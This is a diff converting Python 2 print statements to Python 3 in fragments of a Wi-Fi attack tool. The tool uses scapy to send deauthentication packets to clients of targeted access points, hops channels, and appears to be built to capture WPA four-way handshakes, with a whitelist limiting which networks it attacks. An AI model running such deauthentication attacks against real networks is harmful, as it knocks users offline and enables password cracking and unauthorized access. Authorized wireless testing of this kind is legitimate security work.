@@ -20,13 +20,13 @@ def Deauth(bssid):
 	for n in range(int(count)):
 		# Test and make sure the deauth is coming from the correct interface
 		sendp(packet,iface=attack_iface)
-		print 'Deauth sent via: ' + attack_iface + ' to BSSID: ' + bssid + ' for Client: ' + client
+		print(('Deauth sent via: ' + attack_iface + ' to BSSID: ' + bssid + ' for Client: ' + client))
 		# Need to add EAPOL checks here to make sure we catch all of the 4 way handshake before continuing. 
 	time.sleep(15)
 
 # Make sure the Listener recieved all of the EAPOL packets. 
 def ConfirmEAPOL():
-	print ""
+	print("")
 
 # HoppinIface - Hop the primary Interface to find more beacons.  Much like airodump-ng channel hop
 def HoppinIface(iface):
@@ -54,7 +54,7 @@ def HoppinIface(iface):
 def GetAngry(data):
 	(bssid,attack_channel) = data
 	if bssid not in attack_list:
-		print "Attacking BSSID: %s on Channel %s" % (bssid, attack_channel)
+		print(("Attacking BSSID: %s on Channel %s" % (bssid, attack_channel)))
 
 		iface = pyw.getcard(attack_iface)
 
@@ -67,14 +67,14 @@ def GetAngry(data):
 		attack_list.append(bssid)
 
 	elif bssid in attack_list:
-		print "Already Attacked BSSID: %s" % bssid
+		print(("Already Attacked BSSID: %s" % bssid))
 	else:
-		print "Something went wrong"
+		print("Something went wrong")
 
 # PlayNice will check to make sure the BSSID is on the whitelist.
 def PlayNice(bssid,channel):
 	if bssid in whitelist:
-		print "Approved SSID... Attack!"
+		print("Approved SSID... Attack!")
 		attack_queue.put((bssid,channel))
 	else:
-		print "Avoiding FCC Violations."
+		print("Avoiding FCC Violations.")
